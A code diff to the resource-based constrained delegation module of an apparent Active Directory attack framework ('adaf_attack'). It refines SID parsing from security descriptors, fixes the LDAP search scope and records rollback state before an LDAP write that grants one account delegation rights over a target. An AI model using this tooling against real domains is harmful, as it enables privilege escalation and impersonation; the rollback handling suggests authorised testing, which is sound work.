@@ -14,7 +14,7 @@ import json
 import logging
 from typing import Any
 
-from ldap3 import LEVEL, SUBTREE
+from ldap3 import BASE, SUBTREE
 from rich.console import Console
 
 from adaf_attack.core.acl import fetch_sd, parse_interesting_aces
@@ -38,21 +38,31 @@ UAC_TRUSTED_FOR_DELEG = 0x00080000
 
 
 def _parse_security_descriptor_sids(raw: Any) -> list[str]:
-    """Best-effort extract of SIDs from a security descriptor blob / string."""
-    sids: list[str] = []
+    """Extract principal SIDs from a binary SD, with SDDL/text fallback."""
     if raw is None:
-        return sids
-    try:
-        if isinstance(raw, bytes):
-            text = raw.decode("latin-1", errors="ignore")
-        else:
-            text = str(raw)
-        import re
+        return []
+    blob: bytes | None = None
+    text = ""
+    if isinstance(raw, bytes | bytearray):
+        blob = bytes(raw)
+        text = blob.decode("latin-1", errors="ignore")
+    elif isinstance(raw, str) and raw:
+        text = raw
+        try:
+            blob = bytes.fromhex(raw)
+        except ValueError:
+            blob = None
+    if blob:
+        try:
+            aces = parse_interesting_aces(blob)
+            sids = list(dict.fromkeys(ace.principal_sid for ace in aces if ace.principal_sid))
+            if sids:
+                return sids
+        except Exception:
+            _logger.debug("Could not parse RBCD security descriptor", exc_info=True)
+    import re
 
-        sids = re.findall(r"S-1-5-\d+(?:-\d+)+", text)
-    except Exception:
-        _logger.debug("Could not parse security descriptor SIDs", exc_info=True)
-    return list(dict.fromkeys(sids))
+    return list(dict.fromkeys(re.findall(r"S-1-5-\d+(?:-\d+)+", text)))
 
 
 def _list_attr(entry: Any, name: str) -> list[str]:
@@ -314,11 +324,24 @@ class Rbcd:
             }
 
         try:
-            conn.search(on_dn, "(objectClass=*)", search_scope=LEVEL, attributes=[ATTR_RBCD])
+            conn.search(on_dn, "(objectClass=*)", search_scope=BASE, attributes=[ATTR_RBCD])
             previous = (
                 list(conn.entries[0][ATTR_RBCD].raw_values)
                 if conn.entries and conn.entries[0][ATTR_RBCD]
                 else []
+            )
+            previous_hex = [
+                value.hex() if isinstance(value, bytes) else str(value) for value in previous
+            ]
+            record_pre_state(
+                session,
+                kind="rbcd",
+                target=on_dn,
+                previous=previous_hex,
+                extra={
+                    "rollback": "Restore the recorded msDS-AllowedToActOnBehalfOfOtherIdentity value.",
+                    "set_from": set_from,
+                },
             )
             sd_bytes = build_allowed_to_act_sd(from_sid)
             ok = conn.modify(on_dn, {ATTR_RBCD: [(MODIFY_REPLACE, [sd_bytes])]})
@@ -331,24 +354,12 @@ class Rbcd:
                 "set_from": set_from,
                 "set_from_sid": from_sid,
                 "sd_len": len(sd_bytes),
-                "previous": [
-                    value.hex() if isinstance(value, bytes) else str(value) for value in previous
-                ],
+                "previous": previous_hex,
             }
             if ok:
-                record_pre_state(
-                    session,
-                    kind="rbcd",
-                    target=on_dn,
-                    previous=result["previous"],
-                    extra={
-                        "rollback": "Restore the recorded msDS-AllowedToActOnBehalfOfOtherIdentity value.",
-                        "set_from": set_from,
-                    },
-                )
                 console.print(f"  [green]LDAP REPLACE ok[/green]  {ATTR_RBCD} on {on_dn}")
                 console.print(f"  allowed SID: {from_sid}")
-                console.print("  rollback registered — use: adaf-attack run rollback --force")
+                console.print("  rollback registered — use: adaf-attack rollback --force")
             else:
                 console.print(f"  [red]LDAP modify failed[/red]: {conn.result}")
             return result
